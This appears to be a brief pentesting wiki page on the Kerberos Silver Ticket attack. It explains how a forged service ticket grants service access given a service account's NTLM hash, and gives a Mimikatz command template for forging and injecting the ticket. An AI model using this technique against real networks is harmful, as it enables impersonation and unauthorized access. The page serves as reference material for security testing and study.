# Silver Ticket

## Introduction

A **Silver Ticket** attack is a type of Kerberos attack that allows an **attacker** to forge a **service ticket**.

By creating a forged ticket, the attacker can gain access to specific services (like file shares, databases, or web services) as if they were a legitimate user.

In order to perform this attack the attacker needs the **NTLM hash** or **plaintext password** of the service account they want to impersonate.&#x20;

## Performing the attack

### Mimikatz

Crafting the ticket and inject it to the machine's memory using Mimikatz.

{% code overflow="wrap" %}
```
kerberos::golden /sid:<domain_sid> /domain:<domain> /ptt /target:<spn> /service:<spn_service> /rc4:<service_account_ntlm_hash> /user:<user_to_impersonate>
```
{% endcode %}
